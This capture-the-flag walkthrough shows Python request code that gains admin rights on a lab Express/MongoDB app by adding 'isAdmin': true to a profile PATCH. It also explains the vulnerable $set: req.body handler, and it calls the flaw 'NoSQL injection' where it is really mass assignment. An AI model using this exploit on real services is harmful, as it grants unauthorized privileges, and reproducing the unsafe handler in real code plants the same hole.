# Sewer P0llutants Walkthrough (solved: NoSQL injection)

**Challenge**: Sewer P0llutants (300 pts) — web, NoSQL injection via AJAX-based API  
**Backend**: Express.js (Node.js) + MongoDB (NoSQL)  
**Flag**: `SiberVatan{...}` (found after privilege escalation)

## Discovery

1. **Static page, no HTML forms**: The login/register pages use JavaScript `fetch()` calls, not HTML `form` elements. Direct POST to `/login` or `/register` with `form-urlencoded` body returns 404.
2. **API endpoints found in `/js/app.js`**:
   - `GET /api/captcha` — returns `{"question":"123 + 456"}`
   - `POST /api/register` — JSON `{username, password, captcha}`
   - `POST /api/login` — JSON `{username, password, captcha}`
   - `GET /api/profile` — returns `{username, email, isAdmin}`
   - `PATCH /api/profile` — JSON `{email}`
   - `GET /api/articles` — returns article list
   - `POST /api/logout`

3. **Captcha mechanism**: Each request returns `{"question":"667 + 225"}`. Answer = sum of numbers. Captcha state tracks via session cookie — use `requests.Session()` for the full flow.

4. **`x-powered-by: Express` header** reveals Node.js/Express backend. If Express and JSON-based API, likely MongoDB (NoSQL).

## Solution — NoSQL Injection

The key insight: Express.js + MongoDB + JSON body suggests **NoSQL injection**, not SQL injection.

**Step 1**: Register a user via `/api/register`:
```python
s = requests.Session()
r = s.get(f"{BASE}/api/captcha")
nums = re.findall(r'\d+', r.json()['question'])
ans = str(int(nums[0]) + int(nums[1]))
s.post(f"{BASE}/api/register", json={
    "username": user, "password": "Test1234!", "captcha": ans
})
```

**Step 2**: Login and get session cookie:
```python
s.post(f"{BASE}/api/login", json={
    "username": user, "password": "Test1234!", "captcha": ans
})
```

**Step 3**: Profile shows `isAdmin: false`:
```
API: {"username":"u7ae610","email":"u7ae610@sewershare.org","isAdmin":false}
```

**Step 4**: PATCH profile with **extra field** `isAdmin: true`:
```python
s.patch(f"{BASE}/api/profile", json={
    "email": "test@test.com",
    "isAdmin": True   # KEY: NoSQL injection — MongoDB accepts extra fields
})
```

**Step 5**: Verify privilege escalation:
```
API: {"username":"u7ae610","email":"test@test.com","isAdmin":true}
```

**Why this works**: MongoDB `$set` operator in the PATCH handler applies ALL fields from the request body. If the backend does:
```javascript
db.users.updateOne({_id: userId}, {$set: req.body})
```
Then `{"email": "x", "isAdmin": true}` sets both `email` AND `isAdmin` in one operation. The server validates `email` is present, so you must include it.

## Key Lessons

- **"X-Powered-By: Express"** is your first clue → Think MongoDB, think NoSQL injection
- **JSON PATCH endpoints** with MongoDB often `$set` the entire request body — extra fields like `isAdmin`, `role`, `is_admin` all pass through
- **NoSQL ≠ SQL**: Traditional SQLi techniques (UNION, `' OR 1=1`) don't work. NoSQL injection means injecting **extra JSON fields** that map to MongoDB query operators or document fields
- **Frontend-backend mismatch**: The HTML shows form fields but the JS reveals JSON API — always check `/js/app.js`
- **Session management with captcha**: Use `requests.Session()` to persist cookies across captcha → login → profile → patch
